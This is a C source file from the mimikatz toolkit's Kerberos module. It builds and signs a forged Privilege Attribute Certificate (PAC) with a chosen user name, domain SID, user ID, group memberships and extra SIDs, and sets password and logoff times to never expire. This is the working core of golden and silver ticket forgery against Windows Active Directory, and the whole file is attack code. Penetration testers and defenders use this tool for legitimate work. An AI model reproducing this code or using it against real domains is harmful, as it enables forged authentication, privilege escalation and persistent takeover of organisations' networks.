/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "kuhl_m_kerberos_pac.h"

BOOL kuhl_m_pac_giveMePac(PCSTR Username, PCSTR LogonDomainName, PSID DomainSid, DWORD UserId, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, KerberosTime * AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 * pac)
{
	BOOL status = FALSE;
	KERB_VALIDATION_INFO validationInfo = {0};
	STRING user, logondomain;
	kull_m_kerberos_asn1_helper_get_KerberosTime2(AuthTime, &validationInfo.LogonTime);
	KIWI_NEVERTIME(&validationInfo.LogoffTime);
	KIWI_NEVERTIME(&validationInfo.KickOffTime);
	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);

	pac->length = 0;
	pac->value = NULL;

	RtlInitString(&user, Username);
	RtlInitString(&logondomain, LogonDomainName);
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&validationInfo.EffectiveName, &user, TRUE)))
	{
		if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&validationInfo.LogonDomainName, &logondomain, TRUE)))
		{
			validationInfo.LogonDomainId = (PISID) DomainSid;

			validationInfo.UserId				= UserId;
			validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
			validationInfo.PrimaryGroupId		= groups[0].RelativeId;
			validationInfo.GroupCount = cbGroups;
			validationInfo.GroupIds = groups;
			validationInfo.SidCount = cbSids;
			validationInfo.ExtraSids = sids;

			if(cbSids && sids)
				validationInfo.UserFlags |= 0x20;

			if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
			{
				kprintf("  * PAC generated\n");
				if(status = NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, SignatureType, SignatureKey ? SignatureKey->keyvalue.value : NULL, SignatureKey ?  SignatureKey->keyvalue.length : 0)))
					kprintf("  * PAC \"\"\"signed\"\"\"\n");
				else LocalFree(pac->value);
			}
			RtlFreeUnicodeString(&validationInfo.LogonDomainName);
		}
		RtlFreeUnicodeString(&validationInfo.EffectiveName);
	}
	return status;
}

BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, DWORD SignatureType, PPACTYPE * pacType, DWORD * pacLength)
{
	BOOL status = FALSE;
	PVOID pLogonInfo = NULL;
	PPAC_CLIENT_INFO pClientInfo = NULL;
	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
	DWORD szLogonInfo = 0, szLogonInfoAligned, szClientInfo = 0, szClientInfoAligned, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER);
	PKERB_CHECKSUM pCheckSum;

	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
	{
		szSignature += pCheckSum->Size;
		szSignatureAligned = SIZE_ALIGN(szSignature, 8);

		if(kull_m_pac_EncodeValidationInformation(&validationInfo, &pLogonInfo, &szLogonInfo))
			szLogonInfoAligned = SIZE_ALIGN(szLogonInfo, 8);
		if(kuhl_m_pac_validationInfo_to_CNAME_TINFO(validationInfo, &pClientInfo, &szClientInfo))
			szClientInfoAligned = SIZE_ALIGN(szClientInfo, 8);

		if(pLogonInfo && pClientInfo)
		{
			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + 2 * szSignatureAligned;
			if(*pacType = (PPACTYPE) LocalAlloc(LPTR, *pacLength))
			{
				(*pacType)->cBuffers = 4;
				(*pacType)->Version = 0;

				(*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
				(*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
				(*pacType)->Buffers[0].Offset = offsetData;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[0].Offset, pLogonInfo, (*pacType)->Buffers[0].cbBufferSize);

				(*pacType)->Buffers[1].cbBufferSize = szClientInfo;
				(*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
				(*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);

				(*pacType)->Buffers[2].cbBufferSize = szSignature;
				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
				(*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[2].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				(*pacType)->Buffers[3].cbBufferSize = szSignature;
				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_CHECKSUM_KDC;
				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szSignatureAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[3].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				status = TRUE;
			}
		}

		if(pLogonInfo)
			LocalFree(pLogonInfo);
		if(pClientInfo)
			LocalFree(pClientInfo);
	}
	return status;
}

NTSTATUS kuhl_m_pac_signature(PPACTYPE pacType, DWORD pacLenght, DWORD SignatureType, LPCVOID key, DWORD keySize)
{
	NTSTATUS status;
	DWORD i;
	PKERB_CHECKSUM pCheckSum;
	PVOID Context;
	PPAC_SIGNATURE_DATA pSignatureData;
	PBYTE checksumSrv = NULL, checksumpKdc = NULL;

	status = CDLocateCheckSum(SignatureType, &pCheckSum);
	if(NT_SUCCESS(status))
	{
		status = STATUS_NOT_FOUND;
		for(i = 0; i < pacType->cBuffers; i++)
		{
			if((pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV) || (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC))
			{
				pSignatureData = (PPAC_SIGNATURE_DATA) ((PBYTE) pacType + pacType->Buffers[i].Offset);
				RtlZeroMemory(pSignatureData->Signature, pCheckSum->Size);
				if(pacType->Buffers[i].ulType ==  PACINFO_TYPE_CHECKSUM_SRV)
					checksumSrv = pSignatureData->Signature;
				else
					checksumpKdc = pSignatureData->Signature;
			}
		}
		if(checksumSrv && checksumpKdc)
		{
			status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
			if(NT_SUCCESS(status))
			{
				pCheckSum->Sum(Context, pacLenght, pacType);
				pCheckSum->Finalize(Context, checksumSrv);
				pCheckSum->Finish(&Context);
				status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
				if(NT_SUCCESS(status))
				{
					pCheckSum->Sum(Context, pCheckSum->Size, checksumSrv);
					pCheckSum->Finalize(Context, checksumpKdc);
					pCheckSum->Finish(&Context);
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_pac_validationInfo_to_CNAME_TINFO(PKERB_VALIDATION_INFO validationInfo, PPAC_CLIENT_INFO * pacClientInfo, DWORD * pacClientInfoLength)
{
	BOOL status = FALSE;
	*pacClientInfoLength = sizeof(PAC_CLIENT_INFO) + validationInfo->EffectiveName.Length - sizeof(wchar_t);
	if(*pacClientInfo = (PPAC_CLIENT_INFO) LocalAlloc(LPTR, *pacClientInfoLength))
	{
		(*pacClientInfo)->ClientId = validationInfo->LogonTime;
		(*pacClientInfo)->NameLength = validationInfo->EffectiveName.Length;
		RtlCopyMemory((*pacClientInfo)->Name, validationInfo->EffectiveName.Buffer, (*pacClientInfo)->NameLength);
		status = TRUE;
	}
	return status;
}